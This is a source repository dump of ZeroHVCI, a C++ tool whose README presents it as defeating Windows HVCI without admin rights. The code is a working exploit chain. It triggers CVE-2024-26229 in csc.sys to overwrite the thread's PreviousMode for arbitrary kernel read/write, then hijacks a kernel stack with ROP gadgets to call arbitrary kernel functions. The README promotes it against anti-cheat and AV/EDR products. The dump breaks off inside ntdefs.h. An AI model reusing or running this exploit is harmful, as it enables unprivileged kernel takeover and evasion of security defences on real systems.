Project Path: arc_gmh5225_ZeroHVCI_ocsjdxs8

Source Tree:

```txt
arc_gmh5225_ZeroHVCI_ocsjdxs8
├── README.md
├── ZeroHVCI
│   ├── ZeroHVCI.cpp
│   ├── ZeroHVCI.vcxproj
│   ├── ZeroHVCI.vcxproj.filters
│   ├── exploit.h
│   ├── kforge.h
│   ├── ntdefs.h
│   └── utils.h
└── ZeroHVCI.sln

```

`README.md`:

```md

<h1 align="left">
  ZeroHVCI - Defeating HVCI without admin privileges or a kernel driver
</h1>

ZeroHVCI accomplishes arbitrary kernel read/writes/function calling in Hypervisor-Protected Code Integrity (HVCI) protected environments calling without admin permissions or kernel drivers.
<img src="https://i.imgur.com/LE46Isc.png" alt="tab">
<h2>Features</h2>
<ul>
  <li>Full non-privileged kernel read/writes: Kernel read/writes are achieved by leveraging CVE-2024-26229 which requires no process elevation.</li>
  <li>Arbitrary Function Calling: Calls any arbitrary kernel functions with desired params fully from user land.</li>
</ul>

<h2>Getting Started</h2>
<p>To get started with ZeroHVCI, you can clone this repository and build the project.</p>
<h2>Usage</h2>

```C++
//
// Read kernel memory example:
//
ReadKernelMemory(source_address, buffer_address, size);
```

```C++
//
// Write kernel memory example:
//
WriteKernelMemory(source_address, buffer_address, size);
```

```C++
//
// Kernel function calling example via name:
//
KF::CallKernelFunctionViaName<kernel_param_type1, kernel_param_type2, kernel_param_type3>(
  "kernel_function_name",
  param1,
  param2,
  param3);
```

```C++
//
// ExAllocatePool example:
//
KF::CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T>("ExAllocatePool", PoolType, Size);
```

```C++
//
// memcpy example:
//
KF::CallKernelFunctionViaName<PVOID, PVOID, PVOID, SIZE_T>("memcpy", Dst, Src, Size);
```

```C++
//
// PsLookupProcessByProcessId example:
//
PEPROCESS Process;
KF::CallKernelFunctionViaName<NTSTATUS, HANDLE, PEPROCESS*>("PsLookupProcessByProcessId", ProcessHandle, &Process);
```

<h2>How it works</h2>
<p>Two main projects are responsible for making this possible</p>
<ul>
  <li> <b>CVE-2024-26229</b>- All credits to Eric Egsgard, this exploit allows us to gain kernel read/write by abusing a IOCTL with METHOD_NEITHER in csc.sys (a windows module, resources will be linked below if you want to read-up more.</li>
  <li> <b>KernelForge</b>- All credits to Dmytro Oleksiuk, his project allows us to gain HVCI-compliant kernel function calling by abusing the heirarchy of thread executions and construction rop chains without truly patching anything.</li>
</ul>


<h2>What is this for?</h2>
<p>This is a multi-purpose project which will help people in many sectors, this includes memory-hacking against anti-cheats like Riot Vanguard as we've seen with the HVCI enforcements, this can also be used as a toolkit against AVs/EDRs/XDRs due to the nature that it requires no escalation to
achieve arbitrary read/writes and calling kernel functions.</p>

<h2>Acknowledgements</h2>

Cr4sh for [KernelForge](https://github.com/Cr4sh/KernelForge)<br>
varwara for his [POC](https://github.com/varwara/CVE-2024-26229)<br>
Eric Egsgard for his [talk](https://www.youtube.com/watch?v=2eHsnZ4BeDI)

```

`ZeroHVCI.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.9.34902.65
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ZeroHVCI", "ZeroHVCI\ZeroHVCI.vcxproj", "{95529189-2FB6-49E4-AB2D-3C925ADA4414}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Debug|x64.ActiveCfg = Debug|x64
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Debug|x64.Build.0 = Debug|x64
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Debug|x86.ActiveCfg = Debug|Win32
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Debug|x86.Build.0 = Debug|Win32
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Release|x64.ActiveCfg = Release|x64
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Release|x64.Build.0 = Release|x64
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Release|x86.ActiveCfg = Release|Win32
		{95529189-2FB6-49E4-AB2D-3C925ADA4414}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {EDAAF301-E300-411E-B6C6-7EE9BFB088AD}
	EndGlobalSection
EndGlobal

```

`ZeroHVCI/ZeroHVCI.cpp`:

```cpp
#include <Windows.h>
#include <iostream>
#include <string>
#include <winternl.h>
#include <stdint.h>
#include <vector>
#include <psapi.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

#include "ntdefs.h"
#include "utils.h"
#include "exploit.h"
#include "kforge.h"

int main()
{
    //
    // Leak System _EPROCESS kernel address
    // 
    uintptr_t SystemEProcess = GetKernelObject(4, (HANDLE)4);
    if (!SystemEProcess)
        return false;

    printf("[+] System EProcess: %p\n", (void*)SystemEProcess);

    //
    // Leak current _KTHREAD kernel address
    //
    uintptr_t CurrentKThread = GetCurrentKThread();
    if (!CurrentKThread)
        return false;

    printf("[+] Current KThread: %p\n", (void*)CurrentKThread);

    //
    // Leak current _EPROCESS kernel address
    //
    uintptr_t CurrentEProcess = GetCurrentEProcess();
    if (!CurrentEProcess)
        return false;

    printf("[+] Current EPROCESS: %p\n", (void*)CurrentEProcess);

    //
    // Abuse CVE-2024-26229 exploit to switch PreviousMode for kernel permissions
    //
    ObtainKernelExploit(CurrentKThread);

    printf("[!] Obtained arbitrary kernel read/writes\n");

    //
    // Read the system cr3
    //
    uintptr_t SystemCr3 = 0;
    ReadKernelMemory(reinterpret_cast<PVOID>(SystemEProcess + 0x28), &SystemCr3, 0x8);

    printf("[!] SystemCr3: %p\n", (void*)SystemCr3);

    if (KF::Initialize())
    {
        auto KernelAllocation = KF::ExAllocatePool(NonPagedPoolNx, 0x1000);
        printf("[!] Allocated kernel memory: %p\n", (void*)KernelAllocation);



        KF::Cleanup();
    }

    //
    // Restoring KTHREAD->PreviousMode
    //
    uint8_t mode = 1;
    WriteKernelMemory(reinterpret_cast<PVOID>(CurrentKThread + KTHREAD_PreviousMode), reinterpret_cast<PVOID>(mode), 0x1);

    printf("[+] Press any key to exit...\n");

    getchar();

    return true;
}
```

`ZeroHVCI/ZeroHVCI.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{95529189-2fb6-49e4-ab2d-3c925ada4414}</ProjectGuid>
    <RootNamespace>ConsoleApplication33</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>ZeroHVCI</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="ZeroHVCI.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="exploit.h" />
    <ClInclude Include="kforge.h" />
    <ClInclude Include="ntdefs.h" />
    <ClInclude Include="utils.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ZeroHVCI/ZeroHVCI.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ZeroHVCI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ntdefs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kforge.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="exploit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`ZeroHVCI/exploit.h`:

```h
#pragma once

#define CSC_DEV_FCB_XXX_CONTROL_FILE            0x001401a3 // vuln ioctl

bool ObtainKernelExploit(uintptr_t TargetKThread)
{
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    if (!hNtdll)
    {
        printf("[-] Failed to obtain ntdll..\n");
        getchar();
        exit(-1);
    }

    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtFsControlFile = (PNtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");

    if (!NtReadVirtualMemory || !NtWriteVirtualMemory || !NtFsControlFile)
    {
        printf("[-] Failed to obtain required functions..\n");
        getchar();
        exit(-1);
    }

    HANDLE hHandle = NULL;

    UNICODE_STRING  ObjectName = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    RtlInitUnicodeString(&ObjectName, L"\\Device\\Mup\\;Csc\\.\\.");
    InitializeObjectAttributes(&ObjectAttributes, &ObjectName, 0, NULL, NULL);

    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    auto Status = NtCreateFile(&hHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] NtCreateFile failed with status = %08x\n", Status);
        getchar();
        exit(-1);
    }

    Status = NtFsControlFile(hHandle, NULL, NULL, NULL, &IoStatusBlock, CSC_DEV_FCB_XXX_CONTROL_FILE, /*Vuln arg*/ reinterpret_cast<void*>(TargetKThread + KTHREAD_PreviousMode - 0x18), 0, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] NtFsControlFile failed with status: %08x\n", Status);
        getchar();
        exit(-1);
    }

    return true;
}

ULONG64 GetEProcessViaPID(ULONG TargetProcessId)
{
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetProcessId);
    return GetKernelObject(TargetProcessId, hHandle);
}

ULONG64 GetCurrentEProcess()
{
    return GetEProcessViaPID(GetCurrentProcessId());
}

ULONG64 GetCurrentKThread()
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    return GetKernelObject(GetCurrentProcessId(), hThread);
}

ULONG64 GetKThread(ULONG TargetProcessId, ULONG TargetThreadId)
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, TargetThreadId);
    return GetKernelObject(TargetProcessId, hThread);
}

bool ReadKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
    size_t cbNumOfBytesRead = 0;

    NTSTATUS Status = NtReadVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, (PULONG)&cbNumOfBytesRead);
    if (!NT_SUCCESS(Status))
    {
        return false;
    }

    return true;
}
bool WriteKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
    size_t cbNumOfBytesWrite = 0;

    NTSTATUS Status = NtWriteVirtualMemory(GetCurrentProcess(), Source, &Buffer, Size, (PULONG)&cbNumOfBytesWrite);

    if (!NT_SUCCESS(Status))
    {
        return false;
    }
    return true;
}
```

`ZeroHVCI/kforge.h`:

```h
#pragma once

#define THREAD_EXIT_CODE 0x1337
#define MAX_ARGS (4 + 9)
#define ARGS(_val_) ((PVOID)(_val_))

namespace KF
{
    bool m_bInitialized = false;
    DWORD m_dwKernelSize = 0;
    DWORD m_dwKernelImageSize = NULL;
    PVOID m_ZwTerminateThread = NULL;
    PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL, m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;

    bool ReadPointerWrapper(PVOID Addr, PVOID* Value)
    {
        // read single pointer from virtual memory address
        return ReadKernelMemory(Addr, Value, sizeof(PVOID));
    }

    bool WritePointerWrapper(PVOID Addr, PVOID Value)
    {
        // write single pointer at virtual memory address
        return WriteKernelMemory(Addr, Value, sizeof(PVOID));
    }

    bool Initialize()
    {
        char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

        if (m_bInitialized) {
            return true;
        }

        PVOID data = nullptr;
        DWORD dwDataSize = 0;
        PIMAGE_NT_HEADERS pHeaders;
        PIMAGE_SECTION_HEADER pSection;

        if (!GetKernelImageInfo(reinterpret_cast<PVOID*>(&m_KernelAddr), &m_dwKernelSize, szKernelName)) {
            return false;
        }

        GetSystemDirectoryA(szKernelPath, MAX_PATH);
        strcat_s(szKernelPath, "\\");
        strcat_s(szKernelPath, szKernelName);

        if (ReadFromFile(szKernelPath, &data, &dwDataSize))
        {
            if (LdrMapImage(data, dwDataSize, &m_KernelImage, &m_dwKernelImageSize)) {
                LdrProcessRelocs(m_KernelImage, reinterpret_cast<PVOID>(m_KernelAddr));
            }
            LocalFree(data);
        }
        else {
            goto _end;
        }

        if (!m_KernelImage) {
            goto _end;
        }

        pHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            RVATOVA(m_KernelImage, reinterpret_cast<PIMAGE_DOS_HEADER>(m_KernelImage)->e_lfanew)
            );

        pSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(
            RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader)
            );

        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; ++i)
        {
            if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
                (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0) {
                for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; ++n) {
                    DWORD ptr = pSection->VirtualAddress + n;

                    // Signature of nt!_guard_retpoline_exit_indirect_rax() used as
                    // ROP gadget to control function argument registers
                    UCHAR sign1[] = { 0x48, 0x8b, 0x44, 0x24, 0x20,  // mov     rax, [rsp+0x20]
                                     0x48, 0x8b, 0x4c, 0x24, 0x28,  // mov     rcx, [rsp+0x28]
                                     0x48, 0x8b, 0x54, 0x24, 0x30,  // mov     rdx, [rsp+0x30]
                                     0x4c, 0x8b, 0x44, 0x24, 0x38,  // mov     r8, [rsp+0x38]
                                     0x4c, 0x8b, 0x4c, 0x24, 0x40,  // mov     r9, [rsp+0x40] 
                                     0x48, 0x83, 0xC4, 0x48,        // add     rsp, 48h
                                     0x48, 0xFF, 0xE0 };             // jmp     rax

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign1, sizeof(sign1))) {
                        // Calculate an actual kernel address
                        m_RopAddr_1 = RVATOVA(m_KernelAddr, ptr);
                    }

                    // ROP gadget used to reserve an extra space for the stack arguments
                    UCHAR sign2[] = { 0x48, 0x83, 0xC4, 0x68,  // add     rsp, 68h
                                     0xC3 };                   // retn

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign2, sizeof(sign2))) {
                        // Calculate an actual kernel address                        
                        m_RopAddr_2 = RVATOVA(m_KernelAddr, ptr);
                    }

                    // RCX control ROP gadget to use in pair with the next one
                    UCHAR sign3[] = { 0x59,  // pop     rcx
                                     0xC3 }; // retn

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign3, sizeof(sign3))) {
                        // Calculate an actual kernel address
                        m_RopAddr_3 = RVATOVA(m_KernelAddr, ptr);
                    }

                    // ROP gadget used to save forged function call return value
                    UCHAR sign4[] = { 0x48, 0x89, 0x01,  // mov     [rcx], rax
                                     0xC3 };            // retn

                    // Match the signature
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign4, sizeof(sign4))) {
                        // Calculate an actual kernel address
                        m_RopAddr_4 = RVATOVA(m_KernelAddr, ptr);

                        // Dummy gadget for stack alignment
                        m_RopAddr_5 = RVATOVA(m_KernelAddr, ptr + 3);
                    }
                }
            }
            pSection++;
        }

        if (!m_RopAddr_1 || !m_RopAddr_2 || !m_RopAddr_3 || !m_RopAddr_4 || !m_RopAddr_5) {
            goto _end;
        }

        printf("[+] ROP1: %p\n", m_RopAddr_1);
        printf("[+] ROP2: %p\n", m_RopAddr_2);
        printf("[+] ROP3: %p\n", m_RopAddr_3);
        printf("[+] ROP4: %p\n", m_RopAddr_4);
        printf("[+] ROP5: %p\n", m_RopAddr_5);

        // Get address of nt!ZwTerminateThread(), needed to gracefully shutdown our dummy thread with messed up kernel stack
        if ((m_ZwTerminateThread = GetKernelZwProcAddress("ZwTerminateThread")) == nullptr) {
            goto _end;
        }

        m_bInitialized = true;

    _end:

        if (!m_bInitialized) {
            if (m_KernelImage) {
                LocalFree(m_KernelImage);
                m_KernelImage = nullptr;
                m_dwKernelImageSize = 0;
            }
        }

        return m_bInitialized;
    }

    bool Cleanup()
    {
        if (m_KernelImage) {
            LocalFree(m_KernelImage);
            m_KernelImage = NULL;
            m_dwKernelImageSize = 0;
        }

        m_bInitialized = false;
        return true;
    }

    DWORD WINAPI dummyThread(LPVOID lpParam) {
        HANDLE hEvent = lpParam;
        WaitForSingleObject(hEvent, INFINITE);
        return 0;
    }

    bool CallKernelFunctionViaAddress(PVOID ProcAddr, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
    {
        BOOL bRet = FALSE;
        HANDLE hThread = NULL, hEvent = NULL;
        PVOID RetVal = NULL;
        DWORD dwThreadId = 0;
        PUCHAR StackBase = NULL, KernelStack = NULL;
        PVOID RetAddr = NULL;
        PUCHAR Ptr;
        PVOID pThread;

        if (!m_bInitialized)
            return FALSE;

        if (dwArgsCount > MAX_ARGS)
            return FALSE;

        // Create waitable event
        if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
            goto _end;

        // Create dummy thread
        if ((hThread = CreateThread(NULL, 0, dummyThread, hEvent, 0, &dwThreadId)) == NULL)
            goto _end;

        while (true) {
            // Determine current state of dummy thread
            DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);
            if (State == -1)
                goto _end;

            if (State == Waiting)
                break;

            SwitchToThread();
        }

        // Get _KTHREAD address by handle
        pThread = GetObjectAddress(hThread);
        if (pThread == NULL)
            goto _end;

        // Get stack base of the thread
        if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_StackBase), (PVOID*)&StackBase))
            goto _end;

        // Get stack pointer of the thread
        if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID*)&KernelStack))
            goto _end;

        RetAddr = NULL;
        Ptr = StackBase - sizeof(PVOID);

        // Walk over the kernel stack
        while (Ptr > KernelStack) {
            DWORD_PTR Val = 0;

            // Read stack value
            if (!ReadPointerWrapper(Ptr, (PVOID*)&Val))
                goto _end;

            /*
                Check for the return address from system call handler back to
                the nt!KiSystemServiceCopyEnd(), it's located at the bottom
                of the kernel stack.
            */
            if (Val > m_KernelAddr &&
                Val < m_KernelAddr + m_dwKernelSize) {
                RetAddr = Ptr;
                break;
            }

            // Go to the next stack location
            Ptr -= sizeof(PVOID);
        }

        if (RetAddr == NULL)
            goto _end;

#define WRITE_STACK(_offset_, _val_)                                                         \
    if (!WritePointerWrapper(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_))) {                       \
        goto _end;                                                                          \
    }

        // Hijack the return address with forged function call
        WRITE_STACK(0x00, m_RopAddr_1);

        // Save an address for the forged function call
        WRITE_STACK(0x08 + 0x20, ProcAddr);

        if (dwArgsCount > 0)
            WRITE_STACK(0x08 + 0x28, Args[0]);  // 1st argument goes in RCX

        if (dwArgsCount > 1)
            WRITE_STACK(0x08 + 0x30, Args[1]);  // 2nd argument goes in RDX

        if (dwArgsCount > 2)
            WRITE_STACK(0x08 + 0x38, Args[2]);  // 3rd argument goes in R8

        if (dwArgsCount > 3)
            WRITE_STACK(0x08 + 0x40, Args[3]);  // 4th argument goes in R9

        // Reserve shadow space and 9 stack arguments
        WRITE_STACK(0x50, m_RopAddr_2);

        for (DWORD i = 4; i < dwArgsCount; ++i)
            WRITE_STACK(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);  // The rest arguments go over the stack right after the shadow space

        // Obtain RetVal address
        WRITE_STACK(0xc0, m_RopAddr_3);
        WRITE_STACK(0xc8, &RetVal);

        // Save return value of the forged function call
        WRITE_STACK(0xd0, m_RopAddr_4);

        // Dummy gadget for stack alignment
        WRITE_STACK(0xd8, m_RopAddr_5);

        // Put the next function call
        WRITE_STACK(0xe0, m_RopAddr_1);

        // Forge nt!ZwTerminateThread() function call
        WRITE_STACK(0xe8 + 0x20, m_ZwTerminateThread);
        WRITE_STACK(0xe8 + 0x28, hThread);
        WRITE_STACK(0xe8 + 0x30, THREAD_EXIT_CODE);

        SwitchToThread();

    _end:

        if (hEvent && hThread) {
            DWORD dwExitCode = 0;

            // Put thread into the ready state
            SetEvent(hEvent);
            WaitForSingleObject(hThread, INFINITE);

            GetExitCodeThread(hThread, &dwExitCode);

            // Check for the magic exit code set by forged call
            if (dwExitCode == THREAD_EXIT_CODE) {
                if (pRetVal) {
                    // Return value of the function
                    *pRetVal = RetVal;
                }
                bRet = TRUE;
            }
        }

        if (hEvent)
            CloseHandle(hEvent);

        if (hThread)
            CloseHandle(hThread);

        return bRet;
    }

    bool CallKernelFunctionViaName(const char* lpszProcName, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
    {
        PVOID FuncAddr = NULL;

        if ((FuncAddr = GetKernelProcAddress(lpszProcName)) == NULL) {
            if (!strncmp(lpszProcName, "Zw", 2)) {
                FuncAddr = GetKernelZwProcAddress(lpszProcName);
            }
        }

        if (FuncAddr == NULL) {
            return FALSE;
        }

        return CallKernelFunctionViaAddress(FuncAddr, Args, dwArgsCount, pRetVal);
    }

    // specialized for no return type
    template<typename... Args>
    void smartNoRetCall(const char* kernelFunctionName, Args... args)
    {
        PVOID argsArray[] = { ARGS(args)... };
        CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), NULL);
    }

    template<typename RetType, typename... Args>
    RetType CallKernelFunctionViaName(const char* kernelFunctionName, Args... args)
    {
        PVOID argsArray[] = { ARGS(args)... };

        PVOID pRet = nullptr;
        BOOL bResult = CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), &pRet);

        if (bResult) {
            return (RetType)pRet;
        }
        else {
            return RetType();
        }
    }

    PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)
    {
        return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T>("ExAllocatePool", PoolType, Size);
    }
}
```

`ZeroHVCI/ntdefs.h`:

```h
#pragma once

#define KTHREAD_StackBase                       0x38
#define KTHREAD_KernelStack                     0x58
#define KTHREAD_PreviousMode                    0x232

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
